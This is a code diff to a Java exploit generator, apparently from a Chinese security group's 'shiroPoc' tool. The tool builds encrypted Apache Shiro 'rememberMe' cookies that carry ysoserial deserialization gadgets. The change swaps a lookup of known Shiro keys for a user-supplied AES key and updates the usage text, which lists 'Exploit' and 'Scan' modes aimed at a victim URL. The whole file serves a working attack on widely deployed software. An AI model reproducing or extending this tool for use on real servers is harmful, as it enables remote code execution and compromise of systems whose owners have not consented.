@@ -1,5 +1,6 @@
 package org.unicodesec;
 
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import yso.payloads.Serializer;
 import yso.payloads.Strings;
 import yso.payloads.annotation.Authors;
@@ -26,7 +27,10 @@ public class GeneratePayload {
             printUsage();
             return;
         }
-        final int keyIndex = Integer.parseInt(args[0]);
+        final String key = args[0];
+        if (Base64.decode(key).length != 16){
+            System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
+        }
         final String payloadType = args[1];
         final String payloadServerType = args[2];
 
@@ -44,8 +48,8 @@ public class GeneratePayload {
             } else {
                 buf = (byte[]) object;
             }
-            String rememberMe = EncryptUtil.shiroEncrypt(keys.keys[keyIndex], buf);
-            System.out.println(String.format("Key: %s", keys.keys[keyIndex]));
+            String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
+            System.out.println(String.format("Key: %s", key));
             System.out.println(String.format("Gadget: %s", payloadType));
             System.out.println(String.format("Exploit Type: %s", payloadServerType));
             System.out.println(String.format("payload length: %s", rememberMe.length()));
@@ -62,7 +66,7 @@ public class GeneratePayload {
     private static void printUsage() {
         System.err.println("Powered by UnicodeSec Potatso");
         System.err.println("Exploit");
-        System.err.println("Usage: java -jar shiroPoc-[version]-all.jar [keyindex] [payload] [回显服务器类型]");
+        System.err.println("Usage: java -jar shiroPoc-[version]-all.jar [key] [payload] [回显服务器类型]");
         System.err.println("Scan");
         System.err.println("Usage: java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
         System.err.println("  Available shiro key:");
